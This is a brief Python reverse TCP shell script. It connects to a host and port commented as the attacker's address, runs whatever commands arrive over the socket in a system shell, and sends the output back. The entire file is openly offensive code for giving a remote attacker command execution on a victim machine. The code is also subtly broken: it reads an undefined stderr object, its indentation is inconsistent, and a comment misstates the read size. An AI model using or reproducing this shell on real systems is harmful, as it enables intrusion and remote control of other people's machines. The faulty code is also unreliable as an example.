# Python reverse tcp shell
# Author - Eoin Finney

import socket							## Starts the connection
import subprocess						## Starts the shell

s=socket.socket()						## Shorthand object s

s.connect(("127.0.0.1",1234))			## Attackers IP address and port

def main():
    while 1:
	## p reads the first 1024KB of the tcp socket
	p=subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	s.send(p.stdout.read()+stderr.read())
